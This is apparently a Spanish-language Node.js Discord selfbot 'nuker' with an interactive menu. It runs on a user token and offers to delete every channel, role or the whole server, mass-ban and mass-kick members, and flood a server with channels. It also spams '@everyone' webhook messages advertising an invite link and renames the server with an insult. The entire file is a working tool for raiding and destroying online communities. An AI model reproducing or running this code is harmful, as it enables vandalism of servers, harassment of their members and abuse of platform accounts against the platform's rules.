const Discord = require("discord.js-selfbot-v13")
const client = new Discord.Client({ newUpdate: false})
const axios = require("axios")
const config = require("./config.json")

const readline = require("readline")
const { constrainedMemory } = require("process")
const { Console } = require("console")

 const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  
process.on('unhandledRejection', (error) => {
  console.error('Error no controlado:', error);
});

process.on('uncaughtException', (error) => {
  console.error('Excepción no capturada:', error);
});
  

const token = config.token


function showMenu() {
    console.log(`

    *                                                   *
    *                                                     *
  **                                                       **
*   **                                                       **   *
**   **          *                               *          **   **
***    *         **                             **         *    ***
****            *********************************            ****
 *******      ***           *******           ***      *******
    ************             *****             ************
       **********    **** * **   ** *******   **********
             ********** ** **     ** ****************
       *************** ** **  ***  **  *****************
        ******   *********************  ******   ******
                  **********************  ***
                  ************************ **
                   **** ** ** **** ** ** **
                    ***  *  *  **  *  *  ***
                     **                  **
                       *                *
                                                      
    ╔═══════════════════════════════════════════════════════════════════════════════════════════════════════╗
    ‖  1-  borra todo los canales     ☠̅ ┃   8-   Banea a todos       ☠̅  ┃    15-  spamea            ☠̅  ‖     
    ‖  2-  Crea muchos canales        ☠̅ ┃   9-   Kickea a todos      ☠̅  ┃    16-  desbanea a todos  ☠̅  ‖       
    ‖  3-  Killea el server           ☠̅ ┃   10-  bypass normal       ☠̅  ┃    17-  se sale del sv    ☠̅  ‖       
    ‖  4-  Deletea todos los roles    ☠̅ ┃   11-  Renamea todos los canal ┃    18-  activity          ☠̅  ‖          
    ‖  5-  crea roles                 ☠̅ ┃   12-  renamea los role    ☠̅  ┃    19-  categorias rename ☠̅  ‖       
    ‖  6-  busca un server donde adm  ☠̅ ┃   13-  bypass bueno        ☠̅  ┃    20-  Deletea el server ☠̅  ‖       
    ‖  7-  Cambia el nombre           ☠̅ ┃   14-  Chekea              ☠̅  ┃    00-  >>                ☠̅  ‖       
    ╚═══════════════════════════════════════════════════════════════════════════════════════════════════════╝

    `);
  }
  
  function main() {
    
    showMenu();
  
    
    rl.question('Selecciona una opción (q para salir): ', (answer) => {
      
      switch (answer) {
        case '1':
         rl.question(`[CONSOLE]: Guild ID: `, (selecGuild) => {
          
                  const guildID = client.guilds.cache.get(selecGuild)

        guildID.channels.cache.forEach(c => c.delete().then( () => {
          console.log(`[CONSOLE]: Channel deleted: ${c.name} // ID CHANNEL: ${c.id}`)
        }))

        setTimeout( () => {
          console.clear()
          main()
        }, 15000)
         })

        break

       case '2':

        rl.question(`[CONSOLE]: Guild ID: `, (selecGuild) => {
          
                  const guildID = client.guilds.cache.get(selecGuild)

                  if(!guildID) return console.clear(), main()
const chanelPromises = [];

                   if(guildID){

                   rl.question(`[CONSOLE]: Chanel name: `, async (name) => {

                          for (let i = 0; i <= 100; i++) {

                chanelPromises.push(axios.post(`https://discord.com/api/v10/guilds/${selecGuild}/channels`, {
                  name: name,
                  type: 0
                },{
                headers: {
                 authorization: token,
              "user-agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
              }
            }))
          }
                  
              for (let i = 0; i <= 30; i++) {

          chanelPromises.push(guildID.channels.create(name).then( () => {
            console.log(`[CONSOLE]: Channel created ${i}`)
          }) )
              }

              await Promise.all(chanelPromises)
                   })
}
    })

 case '3':

 
        rl.question(`[CONSOLE]: Guild ID: `, (selecGuild) => {
          
                  const guildID = client.guilds.cache.get(selecGuild)

                  if(!guildID) return console.clear(), main()

const chanelPromises = [];

                   if(guildID){

guildID.channels.cache.forEach(c => c.delete())

rl.question(`[CONSOLE]: Channel name: `, async (name) => {

                          for (let i = 0; i <= 100; i++) {

                chanelPromises.push(axios.post(`https://discord.com/api/v6/guilds/${selecGuild}/channels`, {
                  name: name,
                  type: 0
                },{
                headers: {
                 authorization: token,
              "user-agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
              }
            }))
          }
                  
              for (let i = 0; i <= 30; i++) {

          chanelPromises.push(guildID.channels.create(name).then( () => {
            console.log(`[CONSOLE]: Channel created ${i}`)
          }))
setTimeout( () => {
  guildID.channels.cache.forEach(async (channel) => { 

    await channel.createWebhook(`K4ai`).then((wb) => spam(wb))
     
 .catch((e) => {});
});

    function spam(wb) {
      for (let amount = 0; amount < 5; amount++) {
        axios({
          url: `https://discordapp.com/api/webhooks/${wb.id}/${wb.token}`,
          method: "POST",
          data: {
            content: `|| @everyone || by K4ai & Yxvk `,
          },
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
          },
        })
          .then(() => {})
          .catch((err) => {});
      }
    }
}, 15000)
              }

              await Promise.all(chanelPromises)
                   })

      }})

       break

       case '4':

        rl.question(`[CONSOLE]: Guild ID: `, async (selecGuild) => {
          
                  const guildID = client.guilds.cache.get(selecGuild)

                  if(!guildID) return console.clear(), main()

const DELETErpomises = [];

                   if(guildID){

                    DELETErpomises.push(guildID.roles.cache.map( roles => roles.delete().then( () => {
    console.log(`[CONSOLE]: Rol deleted: ${roles.name} | ID: ${roles.id} `)
                    })))

      }

      await Promise.all(DELETErpomises)
    })
    
    break

    case '5':

            rl.question(`[CONSOLE]: Guild ID: `, async (selecGuild) => {
          
                  const guildID = client.guilds.cache.get(selecGuild)

                  if(!guildID) return console.clear(), main()

const createROlesPromises = [];

                   if(guildID){

                                rl.question(`[CONSOLE]: Guild ID: `, async (name) => {

                    createROlesPromises.push(guildID.roles.create({name: name}).then( () => {
    console.log(`[CONSOLE]: Rol created: ${roles.name} | ID: ${roles.id} `)
                    }
                    ))

                  })

      }

      await Promise.all(createROlesPromises)
    })
    
    break
  
    case '6':

      rl.question(`[QUESTION]: ID Server: `, (IDServer) => {
        const guildID = client.guilds.cache.get(IDServer)

       if(!guildID) return console.clear(), main()

        const administrator = guildID.roles.cache.map(role => role.permissions.has("ADMINISTRATOR"))

        if(administrator){
          console.log(`[CONSOLE]: HAY ADMINISTRADOR EN EL SERVIDOR: ${guildID.name}`)
        }

        setTimeout( () => {
          console.clear()
          main()
        }, 5000)

      })
      break

      case '7':

            rl.question(`[QUESTION]: ID Server: `, (IDServer) => {
        const guildID = client.guilds.cache.get(IDServer)

if(!guildID) return console.clear(), main()

        guildID.setName(`Server fuckeado por K4AI | https://discord.gg/C9XTuJfGJ5`)
        guildID.setIcon("https://media.discordapp.net/attachments/1242600482703151106/1242621139436703754/21dce2d5857c05bc95597a6cba0c13bd.jpg?ex=664f295e&is=664dd7de&hm=408bda2adbc40ff45288b761b448adfdfc93973f4f1b8b2ccc5c534eac532507&=&format=webp&width=400&height=400")

                setTimeout( () => {
          console.clear()
          main()
        }, 5000)

      })

      break

      case '8':

            rl.question(`[QUESTION]: ID Server: `, async (IDServer) => {
        const guildID = client.guilds.cache.get(IDServer)

        if(!guildID) return console.clear(), main()

      const GD = await client.guilds.cache.get(IDServer)
      const fetched = await GD.members.cache.map((m) => m);

      console.log(`[CONSOLE]: massban ejecutado`);

      for (var i = 0; i < fetched.length; i++) {
        if (fetched[i].id != client.user.id) {
          axios({
            url: `https://discord.com/api/v8/guilds/${IDServer}/bans/${fetched[i].id}`,
            method: "PUT",
            headers: {
              authorization: token,
              "user-agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
            },
          }).then(() => {
            console.log(`[CONSOLE]: Todos baneados correctamente.`);
          });
        }
      }
  })

  break


  case '9':

        rl.question(`[QUESTION]: ID Server: `, async (IDServer) => {
        const guildID = client.guilds.cache.get(IDServer)

if(!guildID) return console.clear(), main()


      const GD = await client.guilds.cache.get(IDServer)
      const fetched = await GD.members.cache.map((m) => m);

      console.log(`[CONSOLE]: mass kick ejecutado`);

      for (var i = 0; i < fetched.length; i++) {
        if (fetched[i].id != client.user.id) {
          axios({
            url: `https://discord.com/api/v8/guilds/${IDServer}/kicks/${fetched[i].id}`,
            method: "PUT",
            headers: {
              authorization: token,
              "user-agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
            },
          }).then(() => {
            console.log(`[CONSOLE]: Todos kickeados correctamente.`);
          });
        }
      }
  })

  break

  case '10':
        rl.question(`[QUESTION]: ID Server: `, async (IDServer) => {

        const guildID = client.guilds.cache.get(IDServer)
        if(!guildID) return console.clear(), main()

        const bypassPromises = [];

  rl.question(`[QUESTION]: Nombre del  bypass: `, async (nAMEbYPASS) => {

    bypassPromises.push(guildID.channels.cache.forEach(ch => ch.setName(nAMEbYPASS).then( () =>  {
      console.log(`[CONSOLE]: canal bypasseado: ${ch.name} ┃ ID Channel: ${ch.id}`)
     })))
     await Promise.all(bypassPromises)
  })
        })

        break

        case '11':

                rl.question(`[QUESTION]: ID Server: `, async (IDServer) => {

        const guildID = client.guilds.cache.get(IDServer)
        if(!guildID) return console.clear(), main()

const canales = guildID.channels.cache.filter(channel => channel.type === 'GUILD_TEXT')

        if(canales.size === 0){
          console.log(`[CONSOLE]: No hay ningun canal para renombrar`)
          console.clear(), main()
        }
        if(canales){

          rl.question(`[CONSOLE]: Nombre para bypass: `, (cnalesBypass) => {

               guildID.channels.cache.filter(channel => channel.type === 'GUILD_TEXT').forEach( ch => ch.setName(cnalesBypass).then( () => {
                console.log(`[CONSOLE]: Canal bypasseado: ${ch.name} ┃ ID: ${ch.id}`)
              }))
        

          })


        }  
      })

      setTimeout( () => {
        console.clear()
        main()
      }, 10000)

      break

      case '12':

            rl.question(`[QUESTION]: ID Server: `, async (IDServer) => {

        const guildID = client.guilds.cache.get(IDServer)
        if(!guildID) return console.clear(), main()

       const roles =  guildID.roles.cache.filter(role =>role.id )

                   rl.question(`[QUESTION]: New role name: `, async (NamEROle) => {

       roles.forEach(role => role.setName(NamEROle).then( () => {
                console.log(`[CONSOLE]: Rol bypasseado: ${role.name} ┃ ID: ${role.id}`)
                   }))
                   })
                  
            })

      

      break

      case '13':
      
        rl.question(`[QUESTION]: ID Server: `, async (IDServer) => {

        const guildID = client.guilds.cache.get(IDServer)
        if(!guildID) return console.clear(), main()
 try {
              for (var i = 0; i < 35; i++) {
               
                  guildID.setCommunity().then( ()=> {
                  console.log(`[CONSOLE]: Comunidad hablitada`)
                })
              }}catch(err){
                console.log(err)
              }


})

break


case '14':

 client.login(token).then( () => {
  console.log(`[CONSOLE]: Cuenta iniciada como: ${client.user.username}`)

  setTimeout( () => {
    console.clear(), main()
  }, 4000)
 })

   break

   case '15':

        rl.question(`[QUESTION]: ID Server: `, async (IDServer) => {

        const guildID = client.guilds.cache.get(IDServer)
        if(!guildID) return console.clear(), main()

        const canal = guildID.channels.cache.filter(ch => ch.type === 'GUILD_TEXT')

        if(canal.size === 0){
          console.log(`[CONSOLE]: no hay canales para spamear`)
        }

        if(canal){

       

    guildID.channels.cache.forEach(async (channel) => { 

    await channel.createWebhook(`K4ai`).then((wb) => spam(wb))
     
 .catch((e) => {});
});

    function spam(wb) {
      for (let amount = 0; amount < 5; amount++) {
        axios({
          url: `https://discordapp.com/api/webhooks/${wb.id}/${wb.token}`,
          method: "POST",
          data: {
            content: `|| @everyone || K4ai is here https://discord.gg/C9XTuJfGJ5`,
          },
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
          },
        })
          .then(() => {})
          .catch((err) => {});
      }
    }}
}, 5000)

break

case '16':

        rl.question(`[QUESTION]: ID Server: `, async (IDServer) => {
        const guildID = client.guilds.cache.get(IDServer)

if(!guildID) return console.clear(), main()


      const GD = await client.guilds.cache.get(IDServer)
      const fetched = await GD.members.cache.map((m) => m);

      console.log(`[CONSOLE]: MASS KICK EXECUTE`);

      for (var i = 0; i < fetched.length; i++) {
        if (fetched[i].id != client.user.id) {
          axios({
            url: `https://discord.com/api/v8/guilds/${IDServer}/unbans/${fetched[i].id}`,
            method: "PUT",
            headers: {
              authorization: token,
              "user-agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
            },
          }).then(() => {
            console.log(`[CONSOLE]: Todos kickeados correctamente`);
          });
        }
      }
  })

  break

  case '17':
            rl.question(`[QUESTION]: ID Server: `, async (IDServer) => {
        const guildID = client.guilds.cache.get(IDServer)

if(!guildID) return console.clear(), main()

guildID.leave().then( () => {
  console.log(`[CONSOLE]: El self bot se salio del servidor: ${guildID.name}┃ ID: ${guildID.id}`)
})

            })

            break

            case '18':

            console.log("[CONSOLE]: Status dnd & no molestar")
            console.log("[CONSOLE]: Status online & stado online")
            console.log("[CONSOLE]: Status invisible & stado invisible")
            console.log("[CONSOLE]: Status idle & estado luna")

            rl.question(`[QUESTION]: Dime el estado: `, async (status) => {

            client.user.setStatus(status)

            })
                  
            break

            case '19':

      rl.question(`[QUESTION]: ID Server: `, async (IDServer) => {

        const guildID = client.guilds.cache.get(IDServer)
        if(!guildID) return console.clear(), main()

const canales = guildID.channels.cache.filter(channel => channel.type === 'GUILD_CATEGORY')

        if(canales.size === 0){
          console.log(`[CONSOLE]: No hay ninguna categoria para renombrar`)
          console.clear(), main()
        }
        if(canales){

          rl.question(`[CONSOLE]: Nombre para bypass: `, (cnalesBypass) => {

               guildID.channels.cache.filter(channel => channel.type === 'GUILD_CATEGORY').forEach( ch => ch.setName(cnalesBypass).then( () => {
                console.log(`[CONSOLE]: Categorida bypasseado: ${ch.name} ┃ ID: ${ch.id}`)
              }))
        

          })


        }  
      })
            break

            case '20':

            
      rl.question(`[QUESTION]: ID Server: `, async (IDServer) => {

        const guildID = client.guilds.cache.get(IDServer)
        if(!guildID) return console.clear(), main()

        client.guilds.cache.get(IDServer).delete()

        console.log(`[CONSOLE]: Servidor eliminado correctamente`)

      })

            break

            case '21':

            process.exit()

            break

        case 'q':
            console.log('¡Hasta luego!');
            process.exit()
          default:
            console.clear()
            console.log('Opción no válida. Por favor, selecciona una opción válida.');
            
            main();
        }
      });
    }
    
    if (require.main === module) {
      main();
    }

client.login(token)